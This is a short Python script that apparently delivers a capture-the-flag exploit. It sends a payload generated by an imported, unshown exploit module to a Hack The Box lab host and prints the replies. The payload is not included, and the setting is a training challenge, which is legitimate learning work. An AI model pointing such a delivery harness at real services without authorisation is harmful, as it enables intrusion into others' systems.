import socket
import exploit

payload = exploit.Main()

s = socket.socket()
s.connect(("docker.hackthebox.eu", 32592))
#s.connect(("localhost", 32491))
s.recv(1024)
input('enter to send')
s.send(payload + b'\n')

while True:
  resp = s.recv(1024)

  if resp == b'':
    break
  else:
    print(resp)
